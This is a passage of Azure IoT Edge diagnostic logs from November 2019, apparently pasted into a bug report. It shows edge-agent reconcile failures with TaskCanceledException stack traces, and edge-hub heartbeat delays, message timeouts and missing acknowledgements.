   at Microsoft.Azure.Devices.Edge.Agent.Docker.DockerEnvironment.GetModulesAsync(CancellationToken token) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Docker/DockerEnvironment.cs:line 50
   at Microsoft.Azure.Devices.Edge.Agent.Edgelet.Version_2019_01_30.ModuleManagementHttpClient.GetModules[T](CancellationToken cancellationToken) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Edgelet/version_2019_01_30/ModuleManagementHttpClient.cs:line 137
   at Microsoft.Azure.Devices.Edge.Agent.Edgelet.Versioning.ModuleManagementHttpClientVersioned.Execute[T](Func`1 func, String operation) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Edgelet/versioning/ModuleManagementHttpClientVersioned.cs:line 123
   at Microsoft.Azure.Devices.Edge.Agent.Edgelet.Version_2019_01_30.ModuleManagementHttpClient.HandleException(Exception exception, String operation) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Edgelet/version_2019_01_30/ModuleManagementHttpClient.cs:line 203
   at Microsoft.Azure.Devices.Edge.Agent.Edgelet.Versioning.ModuleManagementHttpClientVersioned.Execute[T](Func`1 func, String operation)
   at Microsoft.Azure.Devices.Edge.Util.TaskEx.TimeoutAfter[T](Task`1 task, TimeSpan timeout)
   at Microsoft.Azure.Devices.Edge.Agent.Edgelet.Version_2019_01_30.GeneratedCode.EdgeletHttpClient.ListModulesAsync(String api_version, CancellationToken cancellationToken) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Edgelet/version_2019_01_30/generatedCode/EdgeletHttpClient.cs:line 80
   at System.Net.Http.HttpClient.FinishSendAsyncUnbuffered(Task`1 sendTask, HttpRequestMessage request, CancellationTokenSource cts, Boolean disposeCts)
   at Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler.SendAsync(HttpRequestMessage request, CancellationToken cancellationToken) in /home/vsts/work/1/s/edge-util/src/Microsoft.Azure.Devices.Edge.Util/uds/HttpUdsMessageHandler.cs:line 36
   at Microsoft.Azure.Devices.Edge.Util.Uds.HttpRequestResponseSerializer.DeserializeResponse(HttpBufferedStream bufferedStream, CancellationToken cancellationToken) in /home/vsts/work/1/s/edge-util/src/Microsoft.Azure.Devices.Edge.Util/uds/HttpRequestResponseSerializer.cs:line 65
   at Microsoft.Azure.Devices.Edge.Util.Uds.HttpRequestResponseSerializer.SetResponseStatusLine(HttpResponseMessage httpResponse, HttpBufferedStream bufferedStream, CancellationToken cancellationToken) in /home/vsts/work/1/s/edge-util/src/Microsoft.Azure.Devices.Edge.Util/uds/HttpRequestResponseSerializer.cs:line 131
   at Microsoft.Azure.Devices.Edge.Util.Uds.HttpBufferedStream.ReadLineAsync(CancellationToken cancellationToken) in /home/vsts/work/1/s/edge-util/src/Microsoft.Azure.Devices.Edge.Util/uds/HttpBufferedStream.cs:line 62
System.Threading.Tasks.TaskCanceledException: A task was canceled.
<4> 2019-11-28 19:55:47.354 +00:00 [WRN] - Reconcile failed because of the an exception
   at Microsoft.Azure.Devices.Edge.Agent.Core.Agent.ReconcileAsync(CancellationToken token) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Core/Agent.cs:line 149
   at Microsoft.Azure.Devices.Edge.Agent.Core.Agent.GetCurrentModuleSetAsync(CancellationToken token) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Core/Agent.cs:line 227
   at Microsoft.Azure.Devices.Edge.Agent.Docker.DockerEnvironment.GetModulesAsync(CancellationToken token) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Docker/DockerEnvironment.cs:line 50
   at Microsoft.Azure.Devices.Edge.Agent.Edgelet.Version_2019_01_30.ModuleManagementHttpClient.GetModules[T](CancellationToken cancellationToken) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Edgelet/version_2019_01_30/ModuleManagementHttpClient.cs:line 137
   at Microsoft.Azure.Devices.Edge.Agent.Edgelet.Versioning.ModuleManagementHttpClientVersioned.Execute[T](Func`1 func, String operation) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Edgelet/versioning/ModuleManagementHttpClientVersioned.cs:line 123
   at Microsoft.Azure.Devices.Edge.Agent.Edgelet.Version_2019_01_30.ModuleManagementHttpClient.HandleException(Exception exception, String operation) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Edgelet/version_2019_01_30/ModuleManagementHttpClient.cs:line 203
   at Microsoft.Azure.Devices.Edge.Agent.Edgelet.Versioning.ModuleManagementHttpClientVersioned.Execute[T](Func`1 func, String operation)
   at Microsoft.Azure.Devices.Edge.Util.TaskEx.TimeoutAfter[T](Task`1 task, TimeSpan timeout)
   at Microsoft.Azure.Devices.Edge.Agent.Edgelet.Version_2019_01_30.GeneratedCode.EdgeletHttpClient.ListModulesAsync(String api_version, CancellationToken cancellationToken) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Edgelet/version_2019_01_30/generatedCode/EdgeletHttpClient.cs:line 80
   at System.Net.Http.HttpClient.FinishSendAsyncUnbuffered(Task`1 sendTask, HttpRequestMessage request, CancellationTokenSource cts, Boolean disposeCts)
   at Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler.SendAsync(HttpRequestMessage request, CancellationToken cancellationToken) in /home/vsts/work/1/s/edge-util/src/Microsoft.Azure.Devices.Edge.Util/uds/HttpUdsMessageHandler.cs:line 36
   at Microsoft.Azure.Devices.Edge.Util.Uds.HttpRequestResponseSerializer.DeserializeResponse(HttpBufferedStream bufferedStream, CancellationToken cancellationToken) in /home/vsts/work/1/s/edge-util/src/Microsoft.Azure.Devices.Edge.Util/uds/HttpRequestResponseSerializer.cs:line 65
   at Microsoft.Azure.Devices.Edge.Util.Uds.HttpRequestResponseSerializer.SetResponseStatusLine(HttpResponseMessage httpResponse, HttpBufferedStream bufferedStream, CancellationToken cancellationToken) in /home/vsts/work/1/s/edge-util/src/Microsoft.Azure.Devices.Edge.Util/uds/HttpRequestResponseSerializer.cs:line 131
   at Microsoft.Azure.Devices.Edge.Util.Uds.HttpBufferedStream.ReadLineAsync(CancellationToken cancellationToken) in /home/vsts/work/1/s/edge-util/src/Microsoft.Azure.Devices.Edge.Util/uds/HttpBufferedStream.cs:line 62
System.Threading.Tasks.TaskCanceledException: A task was canceled.
<4> 2019-11-28 19:50:32.991 +00:00 [WRN] - Reconcile failed because of the an exception
<6> 2019-11-28 19:47:42.926 +00:00 [INF] - Updated reported properties
   at Microsoft.Azure.Devices.Edge.Agent.Core.Agent.ReconcileAsync(CancellationToken token) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Core/Agent.cs:line 149
   at Microsoft.Azure.Devices.Edge.Agent.Core.Agent.GetCurrentModuleSetAsync(CancellationToken token) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Core/Agent.cs:line 227
   at Microsoft.Azure.Devices.Edge.Agent.Docker.DockerEnvironment.GetModulesAsync(CancellationToken token) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Docker/DockerEnvironment.cs:line 50
   at Microsoft.Azure.Devices.Edge.Agent.Edgelet.Version_2019_01_30.ModuleManagementHttpClient.GetModules[T](CancellationToken cancellationToken) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Edgelet/version_2019_01_30/ModuleManagementHttpClient.cs:line 137
   at Microsoft.Azure.Devices.Edge.Agent.Edgelet.Versioning.ModuleManagementHttpClientVersioned.Execute[T](Func`1 func, String operation) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Edgelet/versioning/ModuleManagementHttpClientVersioned.cs:line 123
   at Microsoft.Azure.Devices.Edge.Agent.Edgelet.Version_2019_01_30.ModuleManagementHttpClient.HandleException(Exception exception, String operation) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Edgelet/version_2019_01_30/ModuleManagementHttpClient.cs:line 203
   at Microsoft.Azure.Devices.Edge.Agent.Edgelet.Versioning.ModuleManagementHttpClientVersioned.Execute[T](Func`1 func, String operation)
   at Microsoft.Azure.Devices.Edge.Util.TaskEx.TimeoutAfter[T](Task`1 task, TimeSpan timeout)
   at Microsoft.Azure.Devices.Edge.Agent.Edgelet.Version_2019_01_30.GeneratedCode.EdgeletHttpClient.ListModulesAsync(String api_version, CancellationToken cancellationToken) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Edgelet/version_2019_01_30/generatedCode/EdgeletHttpClient.cs:line 80
   at System.Net.Http.HttpClient.FinishSendAsyncUnbuffered(Task`1 sendTask, HttpRequestMessage request, CancellationTokenSource cts, Boolean disposeCts)
   at Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler.SendAsync(HttpRequestMessage request, CancellationToken cancellationToken) in /home/vsts/work/1/s/edge-util/src/Microsoft.Azure.Devices.Edge.Util/uds/HttpUdsMessageHandler.cs:line 36
   at Microsoft.Azure.Devices.Edge.Util.Uds.HttpRequestResponseSerializer.DeserializeResponse(HttpBufferedStream bufferedStream, CancellationToken cancellationToken) in /home/vsts/work/1/s/edge-util/src/Microsoft.Azure.Devices.Edge.Util/uds/HttpRequestResponseSerializer.cs:line 65
   at Microsoft.Azure.Devices.Edge.Util.Uds.HttpRequestResponseSerializer.SetResponseStatusLine(HttpResponseMessage httpResponse, HttpBufferedStream bufferedStream, CancellationToken cancellationToken) in /home/vsts/work/1/s/edge-util/src/Microsoft.Azure.Devices.Edge.Util/uds/HttpRequestResponseSerializer.cs:line 131
   at Microsoft.Azure.Devices.Edge.Util.Uds.HttpBufferedStream.ReadLineAsync(CancellationToken cancellationToken) in /home/vsts/work/1/s/edge-util/src/Microsoft.Azure.Devices.Edge.Util/uds/HttpBufferedStream.cs:line 62
System.Threading.Tasks.TaskCanceledException: A task was canceled.
<4> 2019-11-28 19:47:21.219 +00:00 [WRN] - Reconcile failed because of the an exception
<6> 2019-11-28 19:44:26.838 +00:00 [INF] - Successfully completed periodic operation refresh twin config
<6> 2019-11-28 19:44:20.645 +00:00 [INF] - Obtained Edge agent twin from IoTHub with desired properties version 14 and reported properties version 32.
<6> 2019-11-28 19:44:12.509 +00:00 [INF] - Starting periodic operation refresh twin config...
<6> 2019-11-28 19:43:17.800 +00:00 [INF] - Updated reported properties
<6> 2019-11-28 19:41:16.445 +00:00 [INF] - Updated reported properties
   at Microsoft.Azure.Devices.Edge.Agent.Core.Agent.ReconcileAsync(CancellationToken token) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Core/Agent.cs:line 149
   at Microsoft.Azure.Devices.Edge.Agent.Core.Agent.GetCurrentModuleSetAsync(CancellationToken token) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Core/Agent.cs:line 227
   at Microsoft.Azure.Devices.Edge.Agent.Docker.DockerEnvironment.GetModulesAsync(CancellationToken token) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Docker/DockerEnvironment.cs:line 50
   at Microsoft.Azure.Devices.Edge.Agent.Edgelet.Version_2019_01_30.ModuleManagementHttpClient.GetModules[T](CancellationToken cancellationToken) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Edgelet/version_2019_01_30/ModuleManagementHttpClient.cs:line 137
   at Microsoft.Azure.Devices.Edge.Agent.Edgelet.Versioning.ModuleManagementHttpClientVersioned.Execute[T](Func`1 func, String operation) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Edgelet/versioning/ModuleManagementHttpClientVersioned.cs:line 123
   at Microsoft.Azure.Devices.Edge.Agent.Edgelet.Version_2019_01_30.ModuleManagementHttpClient.HandleException(Exception exception, String operation) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Edgelet/version_2019_01_30/ModuleManagementHttpClient.cs:line 203
   at Microsoft.Azure.Devices.Edge.Agent.Edgelet.Versioning.ModuleManagementHttpClientVersioned.Execute[T](Func`1 func, String operation)
   at Microsoft.Azure.Devices.Edge.Util.TaskEx.TimeoutAfter[T](Task`1 task, TimeSpan timeout)
   at Microsoft.Azure.Devices.Edge.Agent.Edgelet.Version_2019_01_30.GeneratedCode.EdgeletHttpClient.ListModulesAsync(String api_version, CancellationToken cancellationToken) in /home/vsts/work/1/s/edge-agent/src/Microsoft.Azure.Devices.Edge.Agent.Edgelet/version_2019_01_30/generatedCode/EdgeletHttpClient.cs:line 80
   at System.Net.Http.HttpClient.FinishSendAsyncUnbuffered(Task`1 sendTask, HttpRequestMessage request, CancellationTokenSource cts, Boolean disposeCts)
   at Microsoft.Azure.Devices.Edge.Util.Uds.HttpUdsMessageHandler.SendAsync(HttpRequestMessage request, CancellationToken cancellationToken) in /home/vsts/work/1/s/edge-util/src/Microsoft.Azure.Devices.Edge.Util/uds/HttpUdsMessageHandler.cs:line 36
   at Microsoft.Azure.Devices.Edge.Util.Uds.HttpRequestResponseSerializer.DeserializeResponse(HttpBufferedStream bufferedStream, CancellationToken cancellationToken) in /home/vsts/work/1/s/edge-util/src/Microsoft.Azure.Devices.Edge.Util/uds/HttpRequestResponseSerializer.cs:line 65
   at Microsoft.Azure.Devices.Edge.Util.Uds.HttpRequestResponseSerializer.SetResponseStatusLine(HttpResponseMessage httpResponse, HttpBufferedStream bufferedStream, CancellationToken cancellationToken) in /home/vsts/work/1/s/edge-util/src/Microsoft.Azure.Devices.Edge.Util/uds/HttpRequestResponseSerializer.cs:line 131
   at Microsoft.Azure.Devices.Edge.Util.Uds.HttpBufferedStream.ReadLineAsync(CancellationToken cancellationToken) in /home/vsts/work/1/s/edge-util/src/Microsoft.Azure.Devices.Edge.Util/uds/HttpBufferedStream.cs:line 62
System.Threading.Tasks.TaskCanceledException: A task was canceled.
<4> 2019-11-28 19:36:26.968 +00:00 [WRN] - Reconcile failed because of the an exception
<6> 2019-11-28 18:44:15.036 +00:00 [INF] - Starting compaction of store moduleState
<6> 2019-11-28 18:44:15.034 +00:00 [INF] - Starting compaction of store deploymentConfig
<6> 2019-11-28 18:44:14.954 +00:00 [INF] - Starting compaction of store default
<6> 2019-11-28 18:44:14.954 +00:00 [INF] - Starting compaction of stores
<6> 2019-11-28 18:44:12.303 +00:00 [INF] - Successfully completed periodic operation refresh twin config
<6> 2019-11-28 18:44:12.291 +00:00 [INF] - Obtained Edge agent twin from IoTHub with desired properties version 14 and reported properties version 30.
<6> 2019-11-28 18:44:12.224 +00:00 [INF] - Starting periodic operation refresh twin config...
<6> 2019-11-28 17:44:12.230 +00:00 [INF] - Successfully completed periodic operation refresh twin config
<6> 2019-11-28 17:44:12.209 +00:00 [INF] - Obtained Edge agent twin from IoTHub with desired properties version 14 and reported properties version 30.
<6> 2019-11-28 17:44:12.176 +00:00 [INF] - Starting periodic operation refresh twin config...
<6> 2019-11-28 16:44:14.958 +00:00 [INF] - Starting compaction of store moduleState
<6> 2019-11-28 16:44:14.957 +00:00 [INF] - Starting compaction of store deploymentConfig
<6> 2019-11-28 16:44:14.945 +00:00 [INF] - Starting compaction of store default
<6> 2019-11-28 16:44:14.945 +00:00 [INF] - Starting compaction of stores
<6> 2019-11-28 16:44:12.165 +00:00 [INF] - Successfully completed periodic operation refresh twin config
<6> 2019-11-28 16:44:12.155 +00:00 [INF] - Obtained Edge agent twin from IoTHub with desired properties version 14 and reported properties version 30.
<6> 2019-11-28 16:44:12.125 +00:00 [INF] - Starting periodic operation refresh twin config...
<6> 2019-11-28 15:44:12.131 +00:00 [INF] - Successfully completed periodic operation refresh twin config
<6> 2019-11-28 15:44:12.118 +00:00 [INF] - Obtained Edge agent twin from IoTHub with desired properties version 14 and reported properties version 30.
<6> 2019-11-28 15:44:12.077 +00:00 [INF] - Starting periodic operation refresh twin config...
<6> 2019-11-28 14:44:14.979 +00:00 [INF] - Starting compaction of store moduleState
<6> 2019-11-28 14:44:14.978 +00:00 [INF] - Starting compaction of store deploymentConfig
<6> 2019-11-28 14:44:14.967 +00:00 [INF] - Starting compaction of store default
<6> 2019-11-28 14:44:14.963 +00:00 [INF] - Starting compaction of stores
<6> 2019-11-28 14:44:12.066 +00:00 [INF] - Successfully completed periodic operation refresh twin config
<6> 2019-11-28 14:44:12.054 +00:00 [INF] - Obtained Edge agent twin from IoTHub with desired properties version 14 and reported properties version 30.
<6> 2019-11-28 14:44:11.998 +00:00 [INF] - Starting periodic operation refresh twin config...
<6> 2019-11-28 13:44:12.001 +00:00 [INF] - Successfully completed periodic operation refresh twin config
<6> 2019-11-28 13:44:11.996 +00:00 [INF] - Obtained Edge agent twin from IoTHub with desired properties version 14 and reported properties version 30.


```
</details>

<details>
<summary>edge-hub logs</summary>

```

<6> 2019-11-28 20:14:22.220 +00:00 [INF] - Started task to cleanup processed and stale messages for endpoint REMOVED BEFORE UPLOAD
   at Microsoft.Azure.Devices.Edge.Hub.Core.Storage.MessageStore.CleanupProcessor.CleanupMessages() in /home/vsts/work/1/s/edge-hub/src/Microsoft.Azure.Devices.Edge.Hub.Core/storage/MessageStore.cs:line 292
   at Microsoft.Azure.Devices.Edge.Storage.SequentialStore`1.RemoveFirst(Func`3 predicate, CancellationToken cancellationToken) in /home/vsts/work/1/s/edge-util/src/Microsoft.Azure.Devices.Edge.Storage/SequentialStore.cs:line 82
--- End of stack trace from previous location where exception was thrown ---
   at Microsoft.Azure.Devices.Edge.Storage.SequentialStore`1.<>c__DisplayClass16_0.<<RemoveFirst>b__0>d.MoveNext() in /home/vsts/work/1/s/edge-util/src/Microsoft.Azure.Devices.Edge.Storage/SequentialStore.cs:line 86
--- End of stack trace from previous location where exception was thrown ---
   at Microsoft.Azure.Devices.Edge.Hub.Core.Storage.MessageStore.CleanupProcessor.<>c__DisplayClass9_0.<<CleanupMessages>g__DeleteMessageCallback|0>d.MoveNext() in /home/vsts/work/1/s/edge-hub/src/Microsoft.Azure.Devices.Edge.Hub.Core/storage/MessageStore.cs:line 265
   at Microsoft.Azure.Devices.Edge.Util.TaskEx.TimeoutAfter[T](Task`1 task, TimeSpan timeout) in /home/vsts/work/1/s/edge-util/src/Microsoft.Azure.Devices.Edge.Util/TaskEx.cs:line 121
System.TimeoutException: Operation timed out
<4> 2019-11-28 20:13:02.974 +00:00 [WRN] - Error cleaning up messages for endpoint iothub
<4> 2019-11-28 20:14:07.755 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 20:14:06 +00:00".
   at Microsoft.Azure.Devices.Edge.Hub.Core.Routing.ModuleEndpoint.ModuleMessageProcessor.ProcessAsync(ICollection`1 routingMessages, IDeviceProxy dp, CancellationToken token) in /home/vsts/work/1/s/edge-hub/src/Microsoft.Azure.Devices.Edge.Hub.Core/routing/ModuleEndpoint.cs:line 166
   at Microsoft.Azure.Devices.Edge.Hub.Core.Device.DeviceMessageHandler.SendMessageAsync(IMessage message, String input) in /home/vsts/work/1/s/edge-hub/src/Microsoft.Azure.Devices.Edge.Hub.Core/device/DeviceMessageHandler.cs:line 416
System.TimeoutException: Message completion response not received
<4> 2019-11-28 20:13:42.325 +00:00 [WRN] - Error sending messages to module REMOVED BEFORE UPLOAD
<4> 2019-11-28 20:13:59.305 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 20:13:59 +00:00".
<4> 2019-11-28 20:13:47.883 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 20:13:46 +00:00".
<4> 2019-11-28 20:13:32.373 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 20:13:31 +00:00".
<4> 2019-11-28 20:13:32.632 +00:00 [WRN] - Did not receive ack for message 36590e93-d2aa-4bb8-945f-fadb2a97885e from device/REMOVED BEFORE UPLOAD
<4> 2019-11-28 20:13:19.732 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 20:13:19 +00:00".
<4> 2019-11-28 20:13:05.717 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 20:13:05 +00:00".
<4> 2019-11-28 20:12:41.097 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 20:12:40 +00:00".
<4> 2019-11-28 20:12:38.480 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 20:12:38 +00:00".
<4> 2019-11-28 20:10:22.524 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 20:09:28 +00:00".
<6> 2019-11-28 20:10:23.496 +00:00 [INF] - Reauthenticating connected clients
<4> 2019-11-28 20:08:55.744 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 20:08:54 +00:00".
<4> 2019-11-28 20:08:50.114 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 20:08:49 +00:00".
<4> 2019-11-28 20:08:36.108 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 20:08:35 +00:00".
<4> 2019-11-28 20:08:31.075 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 20:08:30 +00:00".
<4> 2019-11-28 20:08:12.042 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 20:08:11 +00:00".
<4> 2019-11-28 20:07:33.183 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 20:07:31 +00:00".
<4> 2019-11-28 20:06:32.565 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 20:06:31 +00:00".
<4> 2019-11-28 20:06:10.702 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 20:06:09 +00:00".
<6> 2019-11-28 20:06:08.064 +00:00 [INF] - Entering unreachable state
<4> 2019-11-28 20:06:00.360 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 20:05:59 +00:00".
<6> 2019-11-28 20:05:49.275 +00:00 [INF] - Exiting connected state
<4> 2019-11-28 20:05:25.157 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 20:05:23 +00:00".
<4> 2019-11-28 20:05:18.755 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 20:05:17 +00:00".
<4> 2019-11-28 20:05:18.755 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 20:05:17 +00:00".
<6> 2019-11-28 20:05:18.529 +00:00 [INF] - Reauthenticating connected clients
<4> 2019-11-28 20:04:34.936 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 20:04:34 +00:00".
<4> 2019-11-28 20:04:31.887 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 20:04:31 +00:00".
<4> 2019-11-28 20:03:51.137 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 20:03:50 +00:00".
   at Microsoft.Azure.Devices.Edge.Hub.Core.Routing.ModuleEndpoint.ModuleMessageProcessor.ProcessAsync(ICollection`1 routingMessages, IDeviceProxy dp, CancellationToken token) in /home/vsts/work/1/s/edge-hub/src/Microsoft.Azure.Devices.Edge.Hub.Core/routing/ModuleEndpoint.cs:line 166
   at Microsoft.Azure.Devices.Edge.Hub.Core.Device.DeviceMessageHandler.SendMessageAsync(IMessage message, String input) in /home/vsts/work/1/s/edge-hub/src/Microsoft.Azure.Devices.Edge.Hub.Core/device/DeviceMessageHandler.cs:line 416
System.TimeoutException: Message completion response not received
<4> 2019-11-28 20:02:43.999 +00:00 [WRN] - Error sending messages to REMOVED BEFORE UPLOAD
   at Microsoft.Azure.Devices.Edge.Hub.Core.Routing.ModuleEndpoint.ModuleMessageProcessor.ProcessAsync(ICollection`1 routingMessages, IDeviceProxy dp, CancellationToken token) in /home/vsts/work/1/s/edge-hub/src/Microsoft.Azure.Devices.Edge.Hub.Core/routing/ModuleEndpoint.cs:line 166
   at Microsoft.Azure.Devices.Edge.Hub.Core.Device.DeviceMessageHandler.SendMessageAsync(IMessage message, String input) in /home/vsts/work/1/s/edge-hub/src/Microsoft.Azure.Devices.Edge.Hub.Core/device/DeviceMessageHandler.cs:line 416
System.TimeoutException: Message completion response not received
<4> 2019-11-28 20:02:43.999 +00:00 [WRN] - Error sending messages to module REMOVED BEFORE UPLOAD
<4> 2019-11-28 20:03:02.676 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 20:03:01 +00:00".
<4> 2019-11-28 20:02:58.885 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 20:02:58 +00:00".
<4> 2019-11-28 20:02:52.498 +00:00 [WRN] - Received unknown feedback message from REMOVED BEFORE UPLOAD with lock token 01390dfb-778f-433f-8671-12be45f179c9 and status Complete. Abandoning message.
<4> 2019-11-28 20:02:51.726 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 20:02:50 +00:00".
<4> 2019-11-28 20:02:52.498 +00:00 [WRN] - Received unknown feedback message from REMOVED BEFORE UPLOAD with lock token 065fac1e-523f-4255-95e5-bc5babbd90f1 and status Complete. Abandoning message.
<4> 2019-11-28 20:02:43.999 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 20:02:43 +00:00".
<4> 2019-11-28 20:02:43.904 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 20:02:34 +00:00".
<4> 2019-11-28 20:01:40.251 +00:00 [WRN] - Did not receive ack for message 01390dfb-778f-433f-8671-12be45f179c9 from device/REMOVED BEFORE UPLOAD
<4> 2019-11-28 20:02:12.929 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 20:02:12 +00:00".
<4> 2019-11-28 20:02:12.352 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 20:01:39 +00:00".
<4> 2019-11-28 20:01:40.251 +00:00 [WRN] - Did not receive ack for message 065fac1e-523f-4255-95e5-bc5babbd90f1 from device/REMOVED BEFORE UPLOAD
<4> 2019-11-28 20:00:52.735 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 20:00:52 +00:00".
<4> 2019-11-28 20:00:39.628 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 20:00:38 +00:00".
<4> 2019-11-28 20:00:20.398 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 20:00:19 +00:00".
<6> 2019-11-28 20:00:20.339 +00:00 [INF] - Reauthenticating connected clients
<4> 2019-11-28 19:59:58.851 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:59:58 +00:00".
<4> 2019-11-28 19:59:18.758 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:59:17 +00:00".
<4> 2019-11-28 19:59:12.813 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:59:12 +00:00".
<4> 2019-11-28 19:59:10.168 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:59:08 +00:00".
<4> 2019-11-28 19:59:10.168 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:59:08 +00:00".
<4> 2019-11-28 19:59:07.242 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:59:05 +00:00".
<4> 2019-11-28 19:59:02.372 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:59:01 +00:00".
<4> 2019-11-28 19:58:58.801 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:58:57 +00:00".
<4> 2019-11-28 19:58:54.026 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:58:52 +00:00".
<4> 2019-11-28 19:58:08.459 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:58:08 +00:00".
<4> 2019-11-28 19:58:49.680 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:58:49 +00:00".
<4> 2019-11-28 19:57:23.643 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:57:22 +00:00".
<4> 2019-11-28 19:57:20.426 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:57:19 +00:00".
<4> 2019-11-28 19:57:14.148 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:57:13 +00:00".
<4> 2019-11-28 19:57:12.744 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:57:11 +00:00".
<4> 2019-11-28 19:57:02.654 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:57:01 +00:00".
<4> 2019-11-28 19:56:38.925 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:56:38 +00:00".
<4> 2019-11-28 19:56:06.166 +00:00 [WRN] - Heartbeat took longer than "00:00:01" at "11/28/2019 19:56:04 +00:00".
   at Microsoft.Azure.Devices.Edge.Hub.Core.Routing.ModuleEndpoint.ModuleMessageProcessor.ProcessAsync(ICollection`1 routingMessages, IDeviceProxy dp, CancellationToken token) in /home/vsts/work/1/s/edge-hub/src/Microsoft.Azure.Devices.Edge.Hub.Core/routing/ModuleEndpoint.cs:line 166
   at Microsoft.Azure.Devices.Edge.Hub.Core.Device.DeviceMessageHandler.SendMessageAsync(IMessage message, String input) in /home/vsts/work/1/s/edge-hub/src/Microsoft.Azure.Devices.Edge.Hub.Core/device/DeviceMessageHandler.cs:line 412
